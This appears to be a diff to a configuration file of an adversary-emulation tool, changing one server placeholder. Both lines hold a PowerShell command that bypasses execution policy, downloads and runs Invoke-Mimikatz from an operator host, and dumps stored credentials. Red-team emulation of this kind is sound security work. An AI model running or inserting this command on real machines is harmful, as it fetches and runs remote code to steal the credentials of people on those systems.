@@ -19,4 +19,4 @@ platforms:
   windows:
     psh:
       command: |-
-        powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('#{operator.payloads}/3da065e07b990034e9db78421672f70b63aa5329/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+        powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('#{operator.http}/3da065e07b990034e9db78421672f70b63aa5329/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
